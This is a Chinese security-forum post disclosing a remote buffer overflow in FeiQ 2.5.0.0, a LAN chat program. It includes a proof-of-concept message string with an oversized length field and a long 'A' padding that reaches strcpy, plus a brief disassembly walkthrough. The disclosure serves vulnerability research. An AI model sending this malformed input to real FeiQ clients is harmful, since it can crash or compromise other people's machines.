
# 飞秋远程可利用 0day

> 原文：[`www.pediy.com/kssd/pediy12/143197.html`](https://www.pediy.com/kssd/pediy12/143197.html)

这是人生中的第一个 0day，在此发表留个脚印，本漏洞发现于 2011.11.21（昨天）。
飞秋是一款很流行的区域网聊天工具，很多校内网（我学校就用这个聊天的![](img/f3773294bf3a914c9a8c0c242528a003.jpg "使眼色")）和公司内部都在使用。
声明：本贴只用于学习交流，如使用本帖技术用于非法用途，后果自负。
测试版本：虚拟机中 Windows XP SP3，飞秋版本为 `2.5.0.0`。
## 漏洞分析：
## POC：
`1_lbt4_1#65664#6CF04987CC1A#570#31741#4294967295#2.5a:1317316152:admin:XXCCLI-A10D5C26:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.......`

![](img/727f1341dc0b92a4b864447d9975941f.jpg)

`sub_4405A0` 为从 `ecx` 指向的字符串中提取出第五个和第六个 `#` 之间的字符串。
`ecx` 指向的是：`1#65664#6CF04987CC1A#570#31741#4294967295#2.5a:1317316152:admin:XXCCLI-A10D5C26:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.......`
`eax` 为输出地址，运行后 `var_4024` 为字符串 `4294967295`（`0xFFFFFFFF`）

![](img/777596198c7bc73ffe66ca13ca9e64c4.jpg)

运行后 `var_4028` 位 `0xFFFFFFFF`

![](img/2f0f380ae552ef119e9ea25e11ae7d23.jpg)

![](img/2961d07954376bc9fc3400954c1ac19c.jpg)

绕过有符号比较，进入 `strcpy`, `esi` 指向 `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.......`

结果图：

![](img/8b8edb709d8c088377438a33cd201907.jpg)

![](img/8e1989d7ff1176adeb6232ea740e15ec.jpg)

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || 飞秋 POC 代码.rar |
